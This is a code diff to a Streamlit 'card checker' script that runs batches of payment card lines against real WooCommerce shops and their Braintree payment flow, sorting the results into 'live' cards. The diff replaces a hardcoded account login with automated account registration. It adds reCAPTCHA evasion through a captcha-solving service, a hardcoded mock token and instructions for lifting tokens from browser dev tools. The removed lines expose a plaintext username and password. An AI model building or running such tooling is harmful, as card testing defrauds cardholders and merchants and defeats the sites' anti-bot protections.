@@ -6,6 +6,7 @@ import random
 import string
 import requests
 import time
+import json
 
 # Install required packages if not already installed
 try:
@@ -17,8 +18,76 @@ except ImportError:
     import pyfiglet
     import user_agent
 
+# Function to get reCAPTCHA token
+def get_recaptcha_token(site_key, page_url):
+    st.info("Attempting to solve reCAPTCHA...")
+    
+    # Option 1: Use 2captcha service (recommended for production)
+    # Uncomment and add your API key if you use 2captcha
+    """
+    try:
+        api_key = "YOUR_2CAPTCHA_API_KEY"  # Replace with your actual 2captcha API key
+        data = {
+            'key': api_key,
+            'method': 'userrecaptcha',
+            'googlekey': site_key,
+            'pageurl': page_url,
+            'json': 1
+        }
+        
+        # Step 1: Send the captcha to 2captcha
+        response = requests.post('https://2captcha.com/in.php', data=data)
+        response_json = response.json()
+        
+        if response_json['status'] == 1:
+            request_id = response_json['request']
+            
+            # Step 2: Wait and get the result
+            for _ in range(30):  # Try for 30 times with 5-second delays
+                time.sleep(5)
+                response = requests.get(f'https://2captcha.com/res.php?key={api_key}&action=get&id={request_id}&json=1')
+                response_json = response.json()
+                
+                if response_json['status'] == 1:
+                    return response_json['request']
+                
+                if response_json['request'] != 'CAPCHA_NOT_READY':
+                    break
+            
+            st.error(f"Failed to solve captcha: {response_json['request']}")
+        else:
+            st.error(f"Failed to send captcha: {response_json['request']}")
+    except Exception as e:
+        st.error(f"Error using 2captcha: {str(e)}")
+    """
+    
+    # Option 2: For testing purposes, use a mock token or manual input
+    # This is a simplified approach for demonstration
+    
+    # Mock token (for testing only, will not work in production!)
+    mock_token = "03AFcWeA7KujBjqTwe4XyY6DmEAe2fa-DkTbKCTCN-clEW52H2Fit-itsPZsee6Lruva1ZAp4sghrgISu77DOR8eG-SkLUssHXF8cY0b6bHWE6A0_VBmoS7qaBLKxXdQttJ18NfN4JljADlktXtYE3VSB6JtOCTilLP_OnminvDcjAv0eo4CPaiRCcVszsIBQHZGG0ph3gYBvbe5WtrDYPvocCXaP73J-T9oKCrJ3jia7Mkry_YWXQB7SLGK7u9u4Iu6GM70l9sxLG9NNgu-rNNodTwzZ746krG26MPcvaVUPqwzB5qAU3Son7Dd5O5xTypLl4SiW6Ku0WZ7DcOPPGHMOFAgJwY4A-evdUOhQY23ABzQuD6E4ggM5KDNpzcCWFYbE7"
+    
+    # For real usage, you should either:
+    # 1. Use a captcha solving service like 2captcha, anticaptcha, etc.
+    # 2. Allow manual input of the token:
+    
+    # Option for manual input by the user
+    manual_token = st.text_area(
+        "Enter reCAPTCHA token manually",
+        help="You can get this token by opening the network tab in developer tools, completing the captcha, and copying the value of 'g-recaptcha-response' or similar field",
+        value=mock_token
+    )
+    
+    if st.button("Use this token"):
+        if manual_token:
+            return manual_token
+        else:
+            st.warning("Please enter a token")
+    
+    return mock_token  # Remove this in production, use only the manual input or captcha service
 
-def Tele(ccx):
+
+def Tele(ccx, recaptcha_token=None):
     ccx = ccx.strip()
     n = ccx.split("|")[0]
     mm = ccx.split("|")[1]
@@ -114,13 +183,13 @@ def Tele(ccx):
         'user-agent': user,
     }
     
-    with st.spinner("Checking card... Login phase"):
+    with st.spinner("Checking card... register phase"):
         response = r.get('https://www.yazoomills.com/my-account', headers=headers)
         
         try:
-            login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1)
+            register_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
         except:
-            return "Error: Could not extract login nonce"
+            return "Error: Could not extract register nonce"
     
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -130,19 +199,37 @@ def Tele(ccx):
         'user-agent': user,
     }
     
-    # Fixed login credentials instead of generating new ones
-    fixed_username = "amanda"
-    fixed_password = "ghU6ceuc2TX7she"
+
+    # Get current timestamp for session
+    current_time = time.strftime('%Y-%m-%d %H:%M:%S')
     
     data = {
-        'username': fixed_username,
-        'password': fixed_password,
-        'woocommerce-login-nonce': login_nonce,
-        '_wp_http_referer': '/my-account/',
-        'login': 'Log in'
+    'username': username,
+    'email': acc,
+    'password': password,
+    'wc_order_attribution_source_type': '',
+    'wc_order_attribution_referrer': '(none)',
+    'wc_order_attribution_utm_campaign': '(none)',
+    'wc_order_attribution_utm_source': '(direct)',
+    'wc_order_attribution_utm_medium': '(none)',
+    'wc_order_attribution_utm_content': '(none)',
+    'wc_order_attribution_utm_id': '(none)',
+    'wc_order_attribution_utm_term': '(none)',
+    'wc_order_attribution_utm_source_platform': '(none)',
+    'wc_order_attribution_utm_creative_format': '(none)',
+    'wc_order_attribution_utm_marketing_tactic': '(none)',
+    'wc_order_attribution_session_entry': 'https://www.yazoomills.com/my-account/',
+    'wc_order_attribution_session_start_time': current_time,
+    'wc_order_attribution_session_pages': 6,
+    'wc_order_attribution_session_count': 1,
+    'wc_order_attribution_user_agent': user,
+    'woocommerce-register-nonce': register_nonce,
+    'i13_recaptcha_register_token': recaptcha_token or '',  # Use provided token or empty string
+    '_wp_http_referer': '/my-account/',
+    'register': 'Register',
     }
     
-    with st.spinner("Checking card... Logging in"):
+    with st.spinner("Checking card... REgister"):
         response = r.post('https://www.yazoomills.com/my-account/', headers=headers, data=data)
     
     headers = {
@@ -224,7 +311,7 @@ def Tele(ccx):
     }
         
     with st.spinner("Checking card... Getting client token"):
-        response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+        response = r.post('https://www.yazoomills.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
         
         try:
             enc = response.json()['data']
@@ -376,6 +463,30 @@ st.set_page_config(
     layout="wide"
 )
 
+# Add a sidebar for settings
+with st.sidebar:
+    st.header("Settings")
+    # reCAPTCHA configuration
+    st.subheader("reCAPTCHA Settings")
+    recaptcha_site_key = st.text_input(
+        "reCAPTCHA Site Key", 
+        value="6Lfq2mgqAAAAAMxwxeXtYDFWJGVyjNEZXGMwb375",
+        help="The site key is usually found in the HTML source of the page or in the network requests"
+    )
+    
+    # Option to enable/disable reCAPTCHA solution
+    enable_recaptcha = st.checkbox("Enable reCAPTCHA Solution", value=True)
+    
+    if enable_recaptcha:
+        st.info("""
+        To get a token manually:
+        1. Open browser dev tools (F12)
+        2. Go to Network tab
+        3. Complete the reCAPTCHA on the site
+        4. Look for requests with 'recaptcha' in the name
+        5. Find the g-recaptcha-response value in form data
+        """)
+
 # Add some CSS for styling
 st.markdown("""
 <style>
@@ -467,6 +578,27 @@ st.markdown("</div>", unsafe_allow_html=True)
 # Create a tab view for results
 tab1, tab2 = st.tabs(["Results", "Live Cards"])
 
+# Get reCAPTCHA token if enabled
+recaptcha_token = None
+if 'recaptcha_token' not in st.session_state:
+    st.session_state.recaptcha_token = None
+
+if enable_recaptcha and st.sidebar.button("Get reCAPTCHA Token"):
+    with st.spinner("Getting reCAPTCHA token..."):
+        recaptcha_token = get_recaptcha_token(
+            recaptcha_site_key, 
+            "https://www.yazoomills.com/my-account/"
+        )
+        st.session_state.recaptcha_token = recaptcha_token
+        st.sidebar.success("Token obtained! You can now check cards.")
+
+# Display current token if available
+if st.session_state.recaptcha_token:
+    st.sidebar.code(st.session_state.recaptcha_token[:50] + "...", language=None)
+    if st.sidebar.button("Clear Token"):
+        st.session_state.recaptcha_token = None
+        st.experimental_rerun()
+
 # Check button
 if st.button("Check Cards", key="check_btn"):
     if not cards_text:
@@ -553,7 +685,7 @@ if st.button("Check Cards", key="check_btn"):
                     for retry in range(max_retries):
                         try:
                             # Set a timeout for processing
-                            result = Tele(card_data)
+                            result = Tele(card_data, st.session_state.recaptcha_token)
                             break
                         except Exception as retry_error:
                             if retry < max_retries - 1:
